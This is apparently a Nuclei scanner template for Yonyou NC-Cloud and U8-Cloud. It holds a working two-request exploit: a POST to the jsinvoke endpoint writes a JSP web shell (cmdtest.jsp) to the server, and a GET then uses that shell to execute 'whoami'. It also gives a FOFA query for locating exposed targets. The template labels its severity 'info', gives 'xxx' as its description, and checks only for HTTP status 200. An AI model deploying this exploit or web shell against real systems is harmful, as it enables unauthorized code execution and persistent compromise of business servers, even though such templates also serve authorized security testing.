id: jsinvoke
info:
  name: 用友NC-Cloud-jsinvoke
  author: mike
  severity: info
  description: xxx
  metadata:
    max-request: 1
    verified: true
    fofa-query: app="用友-U8-Cloud",app="用友-NC-Cloud"
http:
  - raw:
      - | 
        POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
        Accept-Encoding: gzip, deflate, br
        Accept: */*
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 260

        {"serviceName": "nc.itf.iufo.IBaseSPService", "methodName": "saveXStreamConfig", "parameterTypes": ["java.lang.Object", "java.lang.String"], "parameters": ["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}", "webapps/nc_web/cmdtest.jsp"]}

      - |
        GET /cmdtest.jsp?error=bsh.Interpreter&cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(%22whoami%22').getInputStream())  HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
        Accept-Encoding: gzip, deflate, br
        Accept: */*
        Connection: close

 
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      # - type: word
      #   words:
      #     - 
